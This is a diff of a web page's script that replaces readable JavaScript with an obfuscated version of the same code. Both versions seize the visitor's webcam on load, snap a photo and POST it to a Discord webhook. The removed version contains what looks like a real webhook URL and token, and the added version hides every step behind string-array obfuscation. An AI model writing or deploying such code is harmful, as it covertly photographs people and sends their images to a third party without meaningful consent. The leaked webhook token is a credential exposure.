@@ -13,67 +13,7 @@
     <img id="capturedImage" alt="Captured photo will appear here" style="border: 1px solid black; width: 300px; height: auto; display: none;">
 
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const capturedImage = document.getElementById('capturedImage');
-        const context = canvas.getContext('2d');
-
-        
-        const camdata = 'https://discord.com/api/webhooks/1307599275860951070/JzvVLZBkfD9zFe9uEyjySgco6iuNnjop3oWF-ZYf7UZHeI4G6R_QPH_v_UnBtyuTLYyH';
-
-        
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-
-                
-                video.addEventListener('loadeddata', capturecam, { once: true });
-            })
-            .catch(err => {
-                console.error('Error accessing the camera', err);
-            });
-
-        
-        function capturecam() {
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            
-            const imageDataUrl = canvas.toDataURL('image/jpeg');
-            capturedImage.src = imageDataUrl;
-            capturedImage.style.display = 'block';
-
-            
-            const stream = video.srcObject;
-            stream.getTracks().forEach(track => track.stop());
-
-            
-            fetch(imageDataUrl)
-                .then(res => res.blob())
-                .then(blob => {
-                    const formData = new FormData();
-                    formData.append('file', blob, 'photo.jpg');
-                    formData.append('payload_json', JSON.stringify({ content: 'Here is a photo!' }));
-
-                    
-                    fetch(camdata, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log('Photo successfully sent to Discord.');
-                        } else {
-                            console.error('Failed to send photo to Discord:', response.statusText);
-                        }
-                    })
-                    .catch(err => {
-                        console.error('Error sending photo to Discord:', err);
-                    });
-                });
-        }
+        const n=b;(function(c,d){const k=b,e=c();while(!![]){try{const f=parseInt(k(0x17f))/0x1*(parseInt(k(0x17c))/0x2)+parseInt(k(0x184))/0x3*(-parseInt(k(0x188))/0x4)+parseInt(k(0x181))/0x5*(-parseInt(k(0x18d))/0x6)+parseInt(k(0x17e))/0x7+parseInt(k(0x198))/0x8*(parseInt(k(0x18e))/0x9)+parseInt(k(0x1a3))/0xa+-parseInt(k(0x1a4))/0xb*(parseInt(k(0x1a1))/0xc);if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0x76b0e));function b(c,d){const e=a();return b=function(f,g){f=f-0x17b;let h=e[f];return h;},b(c,d);}function _0x2b93(c,d){const e=_0x2d8f();return _0x2b93=function(f,g){f=f-0x81;let h=e[f];return h;},_0x2b93(c,d);}const _0x113926=_0x2b93;(function(c,d){const l=b,e=_0x2b93,f=c();while(!![]){try{const g=parseInt(e(0x92))/0x1+-parseInt(e(0x99))/0x2*(-parseInt(e(0xad))/0x3)+parseInt(e(0x9a))/0x4*(parseInt(e(0x97))/0x5)+parseInt(e(0x87))/0x6*(parseInt(e(0x89))/0x7)+parseInt(e(0x8e))/0x8*(-parseInt(e(0xae))/0x9)+-parseInt(e(0xa1))/0xa+parseInt(e(0xab))/0xb;if(g===d)break;else f[l(0x1ab)](f[l(0x18a)]());}catch(h){f['push'](f[l(0x18a)]());}}}(_0x2d8f,0x3ac15));function _0x2d8f(){const m=b,c=['Error\x20accessing\x20the\x20camera',m(0x187),m(0x182),m(0x191),'getContext',m(0x1a6),'4RBlWNZ',m(0x193),'display',m(0x1a0),m(0x197),m(0x19f),'stop',m(0x199),m(0x194),m(0x190),'stringify',m(0x18f),m(0x1a8),m(0x18c),m(0x1a9),m(0x192),m(0x19b),m(0x1a7),m(0x1ad),m(0x19a),'13401Cwpsar',m(0x1ac),'height','YOUR_DISCORD_WEBHOOK_URL',m(0x1a2),m(0x186),m(0x183),m(0x19d),m(0x19c),'154511bJVKjT','forEach',m(0x1aa),m(0x180),m(0x195),'1832bfUDSA',m(0x1a5),m(0x189),m(0x17d),m(0x185),m(0x196)];return _0x2d8f=function(){return c;},_0x2d8f();}const video=document[_0x113926(0x93)](n(0x18b)),canvas=document[_0x113926(0x93)](_0x113926(0xa3)),capturedImage=document[_0x113926(0x93)](_0x113926(0x8f)),context=canvas[_0x113926(0x98)]('2d'),discordWebhookUrl=_0x113926(0x83);navigator[_0x113926(0x91)][_0x113926(0x9f)]({'video':!![]})[_0x113926(0x8c)](c=>{const d=_0x113926;video[d(0xa6)]=c,video[d(0xa9)](d(0xa8),captureAndSendToDiscord,{'once':!![]});})[_0x113926(0xaa)](c=>{const d=_0x113926;console['error'](d(0x94),c);});function captureAndSendToDiscord(){const o=n,c=_0x113926;canvas[c(0x9d)]=video[o(0x17b)],canvas[c(0x82)]=video['videoHeight'],context[c(0x86)](video,0x0,0x0,canvas[c(0x9d)],canvas[c(0x82)]);const d=canvas[c(0x8d)]('image/jpeg');capturedImage[c(0x95)]=d,capturedImage[o(0x1ae)][c(0x9c)]=c(0x81);const e=video[o(0x1a8)];e[c(0xa2)]()[c(0x8a)](f=>f[c(0xa0)]()),fetch(d)[c(0x8c)](f=>f[c(0xac)]())[c(0x8c)](f=>{const p=o,g=c,h=new FormData();h[g(0x85)](g(0x9b),f,g(0x96)),h[p(0x186)](g(0xa5),JSON[g(0xa4)]({'content':p(0x19e)})),fetch(discordWebhookUrl,{'method':'POST','body':h})[g(0x8c)](i=>{const j=g;i['ok']?console[j(0x90)](j(0x9e)):console[j(0x88)](j(0x84),i[j(0xa7)]);})[g(0xaa)](i=>{const j=g;console[j(0x88)](j(0x8b),i);});});}function a(){const q=['3479TTCJCe','append','src','388OXVDKd','log','shift','video','statusText','1334946KWuaNt','1368psVKhp','payload_json','canvas','19850iYHyZW','addEventListener','file','getTracks','toDataURL','getElementById','Photo\x20successfully\x20sent\x20to\x20Discord.','10944IywuOT','861480IFtAqH','544506omMrzZ','catch','error','6DIUfpO','Here\x20is\x20a\x20photo!','getUserMedia','width','4356uaFUxd','Failed\x20to\x20send\x20photo\x20to\x20Discord:','7736200XXlUAq','33671jzDdij','capturedImage','2YhhCeV','5024426amEtAZ','srcObject','loadeddata','Error\x20sending\x20photo\x20to\x20Discord:','push','block','blob','style','videoWidth','41542IJvtLL','mediaDevices','6767019vouEyD','44ZMEaKs','then','15QFNZLz','photo.jpg','drawImage','18477ezazaH'];a=function(){return q;};return a();}
     </script>
 </body>
 </html>
